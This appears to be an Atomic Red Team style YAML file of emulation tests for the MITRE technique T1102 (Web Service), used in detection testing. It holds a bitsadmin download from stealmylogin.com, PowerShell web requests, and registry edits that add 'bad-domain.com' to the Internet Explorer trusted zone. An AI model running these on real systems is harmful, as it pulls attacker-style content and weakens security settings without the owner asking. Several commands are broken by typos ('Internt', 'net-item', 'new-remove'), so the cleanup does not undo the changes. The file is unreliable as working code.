---
attack_technique: T1102
display_name: Web Service

atomic_tests:
- name: Reach out to C2 Pointer URLs via command_prompt
  description: |
    Download data from a public website using command line
  supported_platforms:
    - windows
  executor:
    name: command_prompt
    elevation_required: false
    command: |
      bitsadmin.exe /transfer "DonwloadFile" http://www.stealmylogin.com/ %TEMP%\bitsadmindownload.html
    cleanup_command: |
      del %TEMP%\bitsadmindownload.html


- name: Reach out to C2 Pointer URLs via powershell
  description: |
    Multiple download methods for files using powershell
  supported_platforms:
    - windows
  executor:
    name: powershell
    elevation_required: false
    command: |
      Invoke-WebRequest -Uri www.twitter.com
      $T1102 = (New-Object System.Net.WebClient).DownloadData("https://www.reddit.com/")
      $wc = New-Object System.Net.WebClient
      $T1102 = $wc.DownloadString("https://www.aol.com/")
    cleanup_command: |
      Clear-Variable T1102

- name: setting up a c2 domain under trusted zone map
  description: |
    Adding a domain under trusted settings can be used for mapping external drives which wouldn't 
    be noticed since it is trusted. 
    
  supported_platforms:
    - windows
  executor:
    name: powershell
    elevation_required: false
    command: |
      set-Location "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internt Settings\ZoneMap\Domains\"
      new-item bad-domain.com
      set-Location "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internt Settings\ZoneMap\Domains\bad-domain.com"
      net-item bad-subdomain
      set-Location "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internt Settings\ZoneMap\Domains\bad-domain.com\bad-subdomain"
      new-itemproperty . -Name https -Value 2 -Type DWORD; 
      new-itemproperty . -Name http  -Value 2 -Type DWORD; 
      new-itemproperty . -Name *     -Value 2 -Type DWORD; 

    cleanup_command: |
      set-Location "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internt Settings\ZoneMap\Domains\"
      new-remove  bad-domain.com
